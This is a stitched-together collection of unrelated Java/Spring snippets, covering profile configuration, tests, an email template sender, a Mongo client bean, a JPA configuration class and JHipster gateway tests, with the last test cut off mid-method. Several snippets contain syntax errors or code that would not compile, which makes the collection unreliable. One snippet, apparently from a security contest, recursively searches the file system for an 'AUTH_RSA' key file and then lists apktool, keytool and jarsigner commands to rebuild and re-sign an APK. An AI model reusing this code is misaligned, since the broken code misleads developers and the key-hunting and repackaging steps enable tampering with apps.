class LogbackModule {
  ...
}

@Configuration
@ConditionalOnProperty(value="tools.consul.enabled", havingValue=true) 
@PropertySources({
 @PropertySource("classpath:consul-integration.properties) 
})
public class ToolConsulSampleConfiguration {

}

    @Configuration
    @ConditionalOnExpression("'${datasource.reporter.url:true}' == 'true'")
    protected static class AliasReporterDataSourceConfig {
--------------------------------------------------------------------------------------------------------
public class ProfileManager {
    @Autowired
    private Environment environment;
 
    public void getActiveProfiles() {
        for (String profileName : environment.getActiveProfiles()) {
            System.out.println("Currently active profile - " + profileName);
        }  
    }
}

@Value("${spring.profiles.active}")
private String activeProfile;

public class ProfileManager {
    @Value("${spring.profiles.active:}")
    private String activeProfiles;
 
    public String getActiveProfiles() {
        for (String profileName : activeProfiles.split(",")) {
            System.out.println("Currently active profile - " + profileName);
        }
    }
}
--------------------------------------------------------------------------------------------------------
    @Test
    public void test_ConfirmationController_EndPoint_whenException() {
        // init mocks
        doThrow(new ConfirmationNotFoundException()).when(this.authorityRedisTemplate).hasKey(join(this.confirmationRedisProperty.getKeyPrefix(), DEFAULT_CONFIRMATION_ID));

        // given
        final String errorMessage = String.format("ERROR: cannot find confirmation with id = {%s}", DEFAULT_CONFIRMATION_ID);
        final ConfirmationRequest confirmationRequest = this.getConfirmationRequest(DEFAULT_USER_ID, DEFAULT_CONFIRMATION_ID);
        final UriComponentsBuilder builder = UriComponentsBuilder
                .fromHttpUrl(join(this.baseURL, BASE_CONFIRMATION_URL))
                .queryParam("uid", confirmationRequest.getUid())
                .queryParam("cid", confirmationRequest.getCid());

        // when
        final DefaultExceptionHandler.ExceptionResponse response = this.getTemplate().getForObject(builder.toUriString(), DefaultExceptionHandler.ExceptionResponse.class);

        // then
        assertThat(response, is(not(nullValue())));
        assertThat(response.getStatus(), equalTo(HttpStatus.INTERNAL_SERVER_ERROR.value()));
        assertThat(response.getMessage(), containsString(errorMessage));
        assertThat(response.getPath(), equalTo("/api/v1/confirmations"));
    }
--------------------------------------------------------------------------------------------------------
private static final String EMAIL_INLINEIMAGE_TEMPLATE_NAME = "templateemail.html";

@Bean
public TemplateEngine emailTemplateEngine() {
    templateEngine = new SpringTemplateEngine();
    templateEngine.addTemplateResolver(this.htmlTemplateResolver());
       )

    templateEngine.setTemplateEngineMessageSource(this.messageSource);
    return templateEngine;
}

private static ITemplateResolver htmlTemplateResolver() {
    final ClassLoaderTemplateResolver templateResolver = new ClassLoaderTemplateResolver();
    templateResolver.setOrder(Integer.valueOf(0));
    templateResolver.setPrefix("classpath:/templates/");
    templateResolver.setSuffix(".html");
    templateResolver.setTemplateMode(TemplateResolver.DEFAULT_TEMPLATE_MODE);
    templateResolver.setCharacterEncoding("UTF-8");
    templateResolver.setCacheable(false);
    return templateResolver;
}


public void sendEmail(String emailAddress, String title, String body, Locale local, String image) {
    if (Boolean.parseBoolean(isEmailServiceActivated)) {
        MimeMessage mimeMessage = mailSender.createMimeMessage();
        MimeMessageHelper mailMsg = new MimeMessageHelper(mimeMessage);
        try {
            mailMsg.setFrom(EMAIL_USERNAME);
            mailMsg.setTo(emailAddress);
            mailMsg.setSubject(title);

            // Prepare the evaluation context
            ctx.setLocale(local);
            ctx.setVariable("imageHeaderResourceName", HEADER_LOGO_IMAGE);
            ctx.setVariable("body", body);

            ctx.setVariable("imageResourceName", image);

            final String htmlContent = this.templateEngine.process(new ClassPathResource(EMAIL_INLINEIMAGE_TEMPLATE_NAME).getPath(), ctx);
            mailMsg.setText(htmlContent, true );

            mailMsg.addInline(HEADER_LOGO_IMAGE, new ClassPathResource(HEADER_LOGO_IMAGE ) , PNG_MIME);
            mailMsg.addInline(image, new ClassPathResource(image) , PNG_MIME);

        } catch (MessagingException e) {
            e.printStackTrace();
        }

        mailSender.send(mimeMessage);
    }
}
--------------------------------------------------------------------------------------------------------
String path = null;
File[] list = dir.listFiles();

for (File f : list) {

    if (f.isDirectory()) {
    path = pwn2(f);
    if (path != null)
        return path;
    } else {
    path = f.getAbsolutePath();
    if (path.contains("AUTH_RSA")) {
        Log.d(TAG, "AUTH_RSA found here - " + path);
        return path;
    }
    }
}
return null;

}

apktool b myfolder

keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000

jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore my_application.apk alias_name

Подробнее: https://www.securitylab.ru/contest/500042.php
--------------------------------------------------------------------------------------------------------
@ConditionalOnMissingBean(com.mongodb.client.MongoClient.class)
@ConditionalOnProperty(CONSTANT_MONGODBURI)
@org.springframework.context.annotation.Bean
public com.mongodb.client.MongoClient mongoClient(@Autowired(required = false) com.mongodb.MongoClient mongoClient) {
  if (mongoClient == null) {
    return MongoClients.create(this.environment.getProperty(CONSTANT_MONGODBURI));
  } else {
    List<ServerAddress> addressList = mongoClient.getAllAddress();
    StringBuilder ber = new StringBuilder();
    for (int i = 0; addressList != null && i < addressList.size(); i++) {
      ServerAddress address = addressList.get(i);
      String host = address.getHost();
      int port = address.getPort();
      if (i == 0) {
        ber.append(host).append(":").append(port);
      } else {
        ber.append(",").append(host).append(":").append(port);
      }
    }
    return MongoClients.create(String.format("mongodb://%s", ber.toString()));
  }
}

@ConditionalOnNotAdmin

--------------------------------------------------------------------------------------------------------
http://vdlg-pba11-redis-1.pba.internal:5027/api/v0/registry/applications/user/test@paragon-software.com
--------------------------------------------------------------------------------------------------------
	@Test // SPR-14694
	public void repeatedAccessToResponseViaResource() {

		Resource resource = new ClassPathResource("ludwig.json", this.getClass());

		RestTemplate restTemplate = new RestTemplate();
		restTemplate.setInterceptors(Collections.singletonList(new ContentInterceptor(resource)));

		MockRestServiceServer mockServer = MockRestServiceServer.bindTo(restTemplate)
				.ignoreExpectOrder(true)
				.bufferContent()  // enable repeated reads of response body
				.build();

		mockServer.expect(requestTo("/composers/42")).andExpect(method(HttpMethod.GET))
				.andRespond(withSuccess(resource, MediaType.APPLICATION_JSON));

		restTemplate.getForObject("/composers/{id}", Person.class, 42);

		mockServer.verify();
	}
	
	@Test
	public void expectNeverViolated() {

		String responseBody = "{\"name\" : \"Ludwig van Beethoven\", \"someDouble\" : \"1.6035\"}";

		this.mockServer.expect(once(), requestTo("/composers/42")).andExpect(method(HttpMethod.GET))
				.andRespond(withSuccess(responseBody, MediaType.APPLICATION_JSON));
		this.mockServer.expect(never(), requestTo("/composers/43")).andExpect(method(HttpMethod.GET))
				.andRespond(withSuccess(responseBody, MediaType.APPLICATION_JSON));

		this.restTemplate.getForObject("/composers/{id}", Person.class, 42);
		assertThatExceptionOfType(AssertionError.class).isThrownBy(() ->
				this.restTemplate.getForObject("/composers/{id}", Person.class, 43));
	}
--------------------------------------------------------------------------------------------------------
spring.jpa.properties.hibernate.jdbc.lob.non_contextual_creation=true
 
/*
 * The MIT License
 *
 * Copyright 2017 WildBees Labs.
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 */
package com.wildbeeslabs.api.rest.subscription.configuration;

import com.mchange.v2.c3p0.ComboPooledDataSource;
import com.wildbeeslabs.api.rest.common.service.interfaces.IPropertiesConfiguration;

import java.util.Properties;
import javax.naming.NamingException;
import javax.persistence.EntityManagerFactory;
import javax.sql.DataSource;
import java.beans.PropertyVetoException;

import org.hibernate.SessionFactory;
import com.zaxxer.hikari.HikariDataSource;

import org.apache.commons.lang3.StringUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.autoconfigure.jdbc.DataSourceBuilder;
import org.springframework.boot.autoconfigure.jdbc.DataSourceProperties;
import org.springframework.boot.context.properties.ConfigurationProperties;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Primary;
import org.springframework.data.jpa.repository.config.EnableJpaRepositories;
import org.springframework.orm.jpa.JpaTransactionManager;
import org.springframework.orm.jpa.JpaVendorAdapter;
import org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean;
import org.springframework.orm.jpa.vendor.HibernateJpaVendorAdapter;
import org.springframework.transaction.PlatformTransactionManager;
import org.springframework.transaction.annotation.EnableTransactionManagement;
import org.springframework.beans.factory.FactoryBean;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.beans.factory.config.BeanPostProcessor;
import org.springframework.boot.autoconfigure.EnableAutoConfiguration;
import org.springframework.context.support.PropertySourcesPlaceholderConfigurer;
import org.springframework.dao.annotation.PersistenceExceptionTranslationPostProcessor;
import org.springframework.data.jpa.repository.config.EnableJpaAuditing;
import org.springframework.orm.hibernate5.LocalSessionFactoryBean;
import org.springframework.orm.jpa.persistenceunit.DefaultPersistenceUnitManager;
import org.springframework.orm.jpa.persistenceunit.PersistenceUnitManager;
import org.springframework.orm.jpa.support.PersistenceAnnotationBeanPostProcessor;
import org.springframework.scheduling.annotation.EnableAsync;
import org.springframework.jdbc.datasource.DriverManagerDataSource;

/**
 *
 * Application JPA Configuration
 *
 * @author Alex
 * @version 1.0.0
 * @since 2017-08-08
 */
@Configuration("subscriptionJpaConfiguration")
@EnableAutoConfiguration
@EnableAsync
@EnableJpaAuditing
@EnableTransactionManagement
@EnableJpaRepositories(basePackages = {"com.wildbeeslabs.api.rest.subscription.repository"},
        entityManagerFactoryRef = "entityManagerFactory",
        transactionManagerRef = "transactionManager")
//@ImportResource("classpath:hibernate.cfg.xml")
//@PropertySource({"classpath:application.default.yml"})
public class JpaConfiguration {

//    @PersistenceContext(unitName = "ds2", type = PersistenceContextType.TRANSACTION)
//    private EntityManager em;
    @Autowired
    @Qualifier("subscriptionPropertiesConfiguration")
    private IPropertiesConfiguration propertyConfig;

    /**
     * Get Property Source placeholder
     *
     * @return property source placeholder
     */
    @Bean
    public static PropertySourcesPlaceholderConfigurer propertySourcesPlaceholderConfigurer() {
        return new PropertySourcesPlaceholderConfigurer();
    }

    /**
     * Get Default DataSource properties
     *
     * @return default DataSource properties
     */
    @Bean
    @Primary
    @ConfigurationProperties(ignoreInvalidFields = true, prefix = "datasource.subscriptionapp")
    public DataSourceProperties dataSourceProperties() {
        return new DataSourceProperties();
    }

    /**
     * Get DataSource configuration
     *
     * @return DataSource configuration
     */
    @Bean
    public DataSource dataSource() {
        final DataSourceProperties dataSourceProperties = dataSourceProperties();
        HikariDataSource dataSource = (HikariDataSource) DataSourceBuilder
                .create(dataSourceProperties.getClassLoader())
                .driverClassName(dataSourceProperties.getDriverClassName())
                .url(dataSourceProperties.getUrl())
                .username(dataSourceProperties.getUsername())
                .password(dataSourceProperties.getPassword())
                .type(HikariDataSource.class)
                .build();
        // Basic datasource properties
        //dataSource.setAllowPoolSuspension(propertyConfig.getProperty("datasource.subscriptionapp.allowPoolSuspension", Boolean.class));
        //dataSource.setAutoCommit(propertyConfig.getProperty("datasource.subscriptionapp.autoCommit", Boolean.class));
        //dataSource.setMaximumPoolSize(propertyConfig.getProperty("datasource.subscriptionapp.maxPoolSize", Integer.class));
        // MySQL specific properties
        /*dataSource.addDataSourceProperty("cachePrepStmts", propertyConfig.getProperty("datasource.subscriptionapp.cachePrepStmts"));
        dataSource.addDataSourceProperty("prepStmtCacheSize", propertyConfig.getProperty("datasource.subscriptionapp.prepStmtCacheSize"));
        dataSource.addDataSourceProperty("prepStmtCacheSqlLimit", propertyConfig.getProperty("datasource.subscriptionapp.prepStmtCacheSqlLimit"));
        dataSource.addDataSourceProperty("useServerPrepStmts", propertyConfig.getProperty("datasource.subscriptionapp.useServerPrepStmts"));
        dataSource.addDataSourceProperty("useLocalSessionState", propertyConfig.getProperty("datasource.subscriptionapp.useLocalSessionState"));
        dataSource.addDataSourceProperty("useLocalTransactionState", propertyConfig.getProperty("datasource.subscriptionapp.useLocalTransactionState"));
        dataSource.addDataSourceProperty("rewriteBatchedStatements", propertyConfig.getProperty("datasource.subscriptionapp.rewriteBatchedStatements"));
        dataSource.addDataSourceProperty("cacheResultSetMetadata", propertyConfig.getProperty("datasource.subscriptionapp.cacheResultSetMetadata"));
        dataSource.addDataSourceProperty("cacheServerConfiguration", propertyConfig.getProperty("datasource.subscriptionapp.cacheServerConfiguration"));
        dataSource.addDataSourceProperty("elideSetAutoCommits", propertyConfig.getProperty("datasource.subscriptionapp.elideSetAutoCommits"));
        dataSource.addDataSourceProperty("maintainTimeStats", propertyConfig.getProperty("datasource.subscriptionapp.maintainTimeStats"));
        dataSource.addDataSourceProperty("allowUrlInLocalInfile", propertyConfig.getProperty("datasource.subscriptionapp.allowUrlInLocalInfile"));
        dataSource.addDataSourceProperty("useReadAheadInput", propertyConfig.getProperty("datasource.subscriptionapp.useReadAheadInput"));
        dataSource.addDataSourceProperty("useUnbufferedIO", propertyConfig.getProperty("datasource.subscriptionapp.useUnbufferedIO"));*/
        return dataSource;
    }

    /**
     * Get Combo pool DataSource configuration
     *
     * @return DataSource configuration
     * @throws java.beans.PropertyVetoException
     */
    //@Bean
    public DataSource dataSource2() throws PropertyVetoException {
        final ComboPooledDataSource dataSource2 = new ComboPooledDataSource();
        dataSource2.setAcquireIncrement(propertyConfig.getProperty("datasource.subscriptionapp.acquireIncrement", Integer.class));
        dataSource2.setMaxStatementsPerConnection(propertyConfig.getProperty("datasource.subscriptionapp.maxStatementsPerConnection", Integer.class));
        dataSource2.setMaxStatements(propertyConfig.getProperty("datasource.subscriptionapp.maxStatements", Integer.class));
        dataSource2.setMaxPoolSize(propertyConfig.getProperty("datasource.subscriptionapp.maxPoolSize", Integer.class));
        dataSource2.setMinPoolSize(propertyConfig.getProperty("datasource.subscriptionapp.minPoolSize", Integer.class));
        dataSource2.setJdbcUrl(propertyConfig.getMandatoryProperty("datasource.subscriptionapp.url"));
        dataSource2.setUser(propertyConfig.getMandatoryProperty("datasource.subscriptionapp.username"));
        dataSource2.setPassword(propertyConfig.getMandatoryProperty("datasource.subscriptionapp.password"));
        dataSource2.setDriverClass(propertyConfig.getMandatoryProperty("datasource.subscriptionapp.driverClassName"));
        return dataSource2;
    }

    /**
     * Get DataSource configuration
     *
     * @return DataSource configuration
     * @throws java.beans.PropertyVetoException
     */
    //@Bean
    public DataSource dataSource3() throws PropertyVetoException {
        final DriverManagerDataSource dataSource = new DriverManagerDataSource();
        dataSource.setDriverClassName(propertyConfig.getMandatoryProperty("datasource.subscriptionapp.driverClassName"));
        dataSource.setUrl(propertyConfig.getMandatoryProperty("datasource.subscriptionapp.url"));
        dataSource.setUsername(propertyConfig.getMandatoryProperty("datasource.subscriptionapp.username"));
        dataSource.setPassword(propertyConfig.getMandatoryProperty("datasource.subscriptionapp.password"));
        return dataSource;
    }

    /**
     * Get Entity Manager Factory bean
     *
     * @return local container emf bean
     * @throws javax.naming.NamingException
     */
    @Bean
    public LocalContainerEntityManagerFactoryBean entityManagerFactory() throws NamingException {
        LocalContainerEntityManagerFactoryBean factoryBean = new LocalContainerEntityManagerFactoryBean();
        factoryBean.setDataSource(dataSource());
        factoryBean.setPackagesToScan(new String[]{"com.wildbeeslabs.api.rest.common.model", "com.wildbeeslabs.api.rest.subscription.model"});
        factoryBean.setJpaVendorAdapter(jpaVendorAdapter());
        factoryBean.setJpaProperties(jpaProperties());
        factoryBean.setPersistenceUnitName("local");
//        factoryBean.setPersistenceUnitManager(persistenceUnitManager());
        return factoryBean;
    }

    /**
     * Get Hibernate JPA adapter
     *
     * @return hibernate JPA adapter
     */
    @Bean
    public JpaVendorAdapter jpaVendorAdapter() {
        HibernateJpaVendorAdapter hibernateJpaVendorAdapter = new HibernateJpaVendorAdapter();
//        hibernateJpaVendorAdapter.setShowSql(true);
//        hibernateJpaVendorAdapter.setGenerateDdl(true);
//        hibernateJpaVendorAdapter.setDatabasePlatform(propertyConfig.getMandatoryProperty("datasource.subscriptionapp.hibernate.dialect"));
        return hibernateJpaVendorAdapter;
    }

    /**
     * Get Persistence exception translation processor
     *
     * @return persistence exception translation processor
     */
    @Bean
    public PersistenceExceptionTranslationPostProcessor exceptionTranslation() {
        return new PersistenceExceptionTranslationPostProcessor();
    }

    /**
     * Get JPA properties configuration
     *
     * @return JPA properties configuration
     */
    private Properties jpaProperties() {
        final Properties properties = new Properties();
        properties.put("hibernate.dialect", propertyConfig.getMandatoryProperty("datasource.subscriptionapp.hibernate.dialect"));
        properties.put("hibernate.hbm2ddl.auto", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.hbm2ddl.method"));
        properties.put("hibernate.show_sql", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.showSql"));
        properties.put("hibernate.format_sql", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.formatSql"));
        properties.put("hibernate.max_fetch_depth", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.maxFetchDepth"));
        properties.put("hibernate.default_batch_fetch_size", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.defaultBatchFetchSize"));
        properties.put("hibernate.default_schema", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.defaultSchema"));
        properties.put("hibernate.globally_quoted_identifiers", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.globallyQuotedIdentifiers"));
        properties.put("hibernate.generate_statistics", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.generateStatistics"));
        properties.put("hibernate.bytecode.use_reflection_optimizer", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.bytecode.useReflectionOptimizer"));

        // Configure Lucene Search
        properties.put("spring.jpa.properties.hibernate.search.default.directory_provider", propertyConfig.getProperty("spring.jpa.properties.hibernate.search.default.directoryProvider"));
        properties.put("spring.jpa.properties.hibernate.search.default.indexBase", propertyConfig.getProperty("spring.jpa.properties.hibernate.search.default.indexBase"));
        properties.put("spring.jpa.properties.hibernate.search.default.batch.merge_factor", propertyConfig.getProperty("spring.jpa.properties.hibernate.search.default.batch.mergeFactor"));
        properties.put("spring.jpa.properties.hibernate.search.default.batch.max_buffered_docs", propertyConfig.getProperty("spring.jpa.properties.hibernate.search.default.batch.maxBufferedDocs"));

        if (StringUtils.isNotEmpty(propertyConfig.getProperty("datasource.subscriptionapp.hibernate.hbm2ddl.importFiles"))) {
            properties.put("hibernate.hbm2ddl.import_files", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.hbm2ddl.importFiles"));
        }

        // Configure Hibernate Cache
        properties.put("hibernate.cache.use_second_level_cache", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.cache.useSecondLevelCache"));
        properties.put("hibernate.cache.use_query_cache", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.cache.useQueryCache"));
        properties.put("hibernate.cache.region.factory_class", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.cache.region.factoryClass"));

        // Configure Connection Pool
        properties.put("hibernate.c3p0.min_size", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.c3p0.minSize"));
        properties.put("hibernate.c3p0.max_size", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.c3p0.maxSize"));
        properties.put("hibernate.c3p0.timeout", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.c3p0.timeout"));
        properties.put("hibernate.c3p0.max_statements", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.c3p0.maxStatements"));
        properties.put("hibernate.c3p0.idle_test_period", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.c3p0.idleTestPeriod"));
        return properties;
    }

    /**
     * Get Transaction Manager
     *
     * @param emf - entity manager factory
     * @return transaction manager
     */
    @Bean
    @Autowired
    public PlatformTransactionManager transactionManager(final EntityManagerFactory emf) {
        JpaTransactionManager txManager = new JpaTransactionManager();
        txManager.setEntityManagerFactory(emf);
        return txManager;
    }

    /**
     * Get Session Factory bean
     *
     * @return session factory bean
     */
    @Bean
    public FactoryBean<SessionFactory> sessionFactory() {
        LocalSessionFactoryBean sessionFactory = new LocalSessionFactoryBean();
        sessionFactory.setDataSource(dataSource());
        return sessionFactory;
    }

    /**
     * Get Persistence Unit Manager
     *
     * @return persistence unit manager
     */
    @Bean
    public PersistenceUnitManager persistenceUnitManager() {
        DefaultPersistenceUnitManager manager = new DefaultPersistenceUnitManager();
        manager.setDefaultDataSource(dataSource());
        return manager;
    }

    /**
     * Get Persistence Annotation processor
     *
     * @return persistence annotation processor
     */
    @Bean
    public BeanPostProcessor postProcessor() {
        PersistenceAnnotationBeanPostProcessor postProcessor = new PersistenceAnnotationBeanPostProcessor();
        return postProcessor;
    }
}

 
package com.baeldung.jhipster.gateway.gateway.responserewriting;

import com.netflix.zuul.context.RequestContext;
import org.apache.commons.io.IOUtils;
import org.junit.Test;
import org.springframework.mock.web.MockHttpServletRequest;
import org.springframework.mock.web.MockHttpServletResponse;

import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.util.zip.GZIPInputStream;

import static com.baeldung.jhipster.gateway.gateway.responserewriting.SwaggerBasePathRewritingFilter.gzipData;
import static org.junit.Assert.*;
import static springfox.documentation.swagger2.web.Swagger2Controller.DEFAULT_URL;

/**
 * Tests SwaggerBasePathRewritingFilter class.
 */
public class SwaggerBasePathRewritingFilterTest {

    private SwaggerBasePathRewritingFilter filter = new SwaggerBasePathRewritingFilter();

    @Test
    public void shouldFilter_on_default_swagger_url() {

        MockHttpServletRequest request = new MockHttpServletRequest("GET", DEFAULT_URL);
        RequestContext.getCurrentContext().setRequest(request);

        assertTrue(filter.shouldFilter());
    }

    /**
     * Zuul DebugFilter can be triggered by "deug" parameter.
     */
    @Test
    public void shouldFilter_on_default_swagger_url_with_param() {

        MockHttpServletRequest request = new MockHttpServletRequest("GET", DEFAULT_URL);
        request.setParameter("debug", "true");
        RequestContext.getCurrentContext().setRequest(request);

        assertTrue(filter.shouldFilter());
    }

    @Test
    public void shouldNotFilter_on_wrong_url() {

        MockHttpServletRequest request = new MockHttpServletRequest("GET", "/management/info");
        RequestContext.getCurrentContext().setRequest(request);

        assertFalse(filter.shouldFilter());
    }

    @Test
    public void run_on_valid_response() throws Exception {
        MockHttpServletRequest request = new MockHttpServletRequest("GET", "/service1" + DEFAULT_URL);
        RequestContext context = RequestContext.getCurrentContext();
        context.setRequest(request);

        MockHttpServletResponse response = new MockHttpServletResponse();
        context.setResponseGZipped(false);
        context.setResponse(response);

        InputStream in = IOUtils.toInputStream("{\"basePath\":\"/\"}", StandardCharsets.UTF_8);
        context.setResponseDataStream(in);

        filter.run();

        assertEquals("UTF-8", response.getCharacterEncoding());
        assertEquals("{\"basePath\":\"/service1\"}", context.getResponseBody());
    }

    @Test
    public void run_on_valid_response_gzip() throws Exception {
        MockHttpServletRequest request = new MockHttpServletRequest("GET", "/service1" + DEFAULT_URL);
        RequestContext context = RequestContext.getCurrentContext();
        context.setRequest(request);

        MockHttpServletResponse response = new MockHttpServletResponse();
        context.setResponseGZipped(true);
        context.setResponse(response);

        context.setResponseDataStream(new ByteArrayInputStream(gzipData("{\"basePath\":\"/\"}")));

        filter.run();

        assertEquals("UTF-8", response.getCharacterEncoding());

        InputStream responseDataStream = new GZIPInputStream(context.getResponseDataStream());
        String responseBody = IOUtils.toString(responseDataStream, StandardCharsets.UTF_8);
        assertEquals("{\"basePath\":\"/service1\"}", responseBody);
    }
}

 
 
package com.baeldung.jhipster.gateway.config;

import org.springframework.cloud.client.loadbalancer.RestTemplateCustomizer;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Primary;
import org.springframework.security.oauth2.provider.token.TokenStore;
import org.springframework.security.oauth2.provider.token.store.JwtAccessTokenConverter;
import org.springframework.web.client.RestTemplate;

/**
 * Overrides UAA specific beans, so they do not interfere the testing
 * This configuration must be included in @SpringBootTest in order to take effect.
 */
@Configuration
public class SecurityBeanOverrideConfiguration {

    @Bean
    @Primary
    public TokenStore tokenStore() {
        return null;
    }

    @Bean
    @Primary
    public JwtAccessTokenConverter jwtAccessTokenConverter() {
        return null;
    }

    @Bean
    @Primary
    public RestTemplate loadBalancedRestTemplate(RestTemplateCustomizer customizer) {
        return null;
    }
}

 
 
 
package com.baeldung.jhipster.gateway.config;

import com.codahale.metrics.MetricRegistry;
import com.codahale.metrics.servlet.InstrumentedFilter;
import com.codahale.metrics.servlets.MetricsServlet;
import io.github.jhipster.config.JHipsterConstants;
import io.github.jhipster.config.JHipsterProperties;
import io.github.jhipster.web.filter.CachingHttpHeadersFilter;
import io.undertow.Undertow;
import io.undertow.Undertow.Builder;
import io.undertow.UndertowOptions;
import org.apache.commons.io.FilenameUtils;

import org.h2.server.web.WebServlet;
import org.junit.Before;
import org.junit.Test;
import org.springframework.boot.web.embedded.undertow.UndertowServletWebServerFactory;
import org.springframework.http.HttpHeaders;
import org.springframework.mock.env.MockEnvironment;
import org.springframework.mock.web.MockServletContext;
import org.springframework.test.util.ReflectionTestUtils;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.setup.MockMvcBuilders;
import org.xnio.OptionMap;

import javax.servlet.*;
import java.util.*;

import static org.assertj.core.api.Assertions.assertThat;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.Mockito.*;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.options;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.header;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

/**
 * Unit tests for the WebConfigurer class.
 *
 * @see WebConfigurer
 */
public class WebConfigurerTest {

    private WebConfigurer webConfigurer;

    private MockServletContext servletContext;

    private MockEnvironment env;

    private JHipsterProperties props;

    private MetricRegistry metricRegistry;

    @Before
    public void setup() {
        servletContext = spy(new MockServletContext());
        doReturn(mock(FilterRegistration.Dynamic.class))
            .when(servletContext).addFilter(anyString(), any(Filter.class));
        doReturn(mock(ServletRegistration.Dynamic.class))
            .when(servletContext).addServlet(anyString(), any(Servlet.class));

        env = new MockEnvironment();
        props = new JHipsterProperties();

        webConfigurer = new WebConfigurer(env, props);
        metricRegistry = new MetricRegistry();
        webConfigurer.setMetricRegistry(metricRegistry);
    }

    @Test
    public void testStartUpProdServletContext() throws ServletException {
        env.setActiveProfiles(JHipsterConstants.SPRING_PROFILE_PRODUCTION);
        webConfigurer.onStartup(servletContext);

        assertThat(servletContext.getAttribute(InstrumentedFilter.REGISTRY_ATTRIBUTE)).isEqualTo(metricRegistry);
        assertThat(servletContext.getAttribute(MetricsServlet.METRICS_REGISTRY)).isEqualTo(metricRegistry);
        verify(servletContext).addFilter(eq("webappMetricsFilter"), any(InstrumentedFilter.class));
        verify(servletContext).addServlet(eq("metricsServlet"), any(MetricsServlet.class));
        verify(servletContext).addFilter(eq("cachingHttpHeadersFilter"), any(CachingHttpHeadersFilter.class));
        verify(servletContext, never()).addServlet(eq("H2Console"), any(WebServlet.class));
    }

    @Test
    public void testStartUpDevServletContext() throws ServletException {
        env.setActiveProfiles(JHipsterConstants.SPRING_PROFILE_DEVELOPMENT);
        webConfigurer.onStartup(servletContext);

        assertThat(servletContext.getAttribute(InstrumentedFilter.REGISTRY_ATTRIBUTE)).isEqualTo(metricRegistry);
        assertThat(servletContext.getAttribute(MetricsServlet.METRICS_REGISTRY)).isEqualTo(metricRegistry);
        verify(servletContext).addFilter(eq("webappMetricsFilter"), any(InstrumentedFilter.class));
        verify(servletContext).addServlet(eq("metricsServlet"), any(MetricsServlet.class));
        verify(servletContext, never()).addFilter(eq("cachingHttpHeadersFilter"), any(CachingHttpHeadersFilter.class));
        verify(servletContext).addServlet(eq("H2Console"), any(WebServlet.class));
    }

    @Test
    public void testCustomizeServletContainer() {
        env.setActiveProfiles(JHipsterConstants.SPRING_PROFILE_PRODUCTION);
        UndertowServletWebServerFactory container = new UndertowServletWebServerFactory();
        webConfigurer.customize(container);
        assertThat(container.getMimeMappings().get("abs")).isEqualTo("audio/x-mpeg");
        assertThat(container.getMimeMappings().get("html")).isEqualTo("text/html;charset=utf-8");
        assertThat(container.getMimeMappings().get("json")).isEqualTo("text/html;charset=utf-8");
        if (container.getDocumentRoot() != null) {
            assertThat(container.getDocumentRoot().getPath()).isEqualTo(FilenameUtils.separatorsToSystem("target/www"));
        }

        Builder builder = Undertow.builder();
        container.getBuilderCustomizers().forEach(c -> c.customize(builder));
        OptionMap.Builder serverOptions = (OptionMap.Builder) ReflectionTestUtils.getField(builder, "serverOptions");
        assertThat(serverOptions.getMap().get(UndertowOptions.ENABLE_HTTP2)).isNull();
    }

    @Test
    public void testUndertowHttp2Enabled() {
        props.getHttp().setVersion(JHipsterProperties.Http.Version.V_2_0);
        UndertowServletWebServerFactory container = new UndertowServletWebServerFactory();
        webConfigurer.customize(container);
        Builder builder = Undertow.builder();
        container.getBuilderCustomizers().forEach(c -> c.customize(builder));
        OptionMap.Builder serverOptions = (OptionMap.Builder) ReflectionTestUtils.getField(builder, "serverOptions");
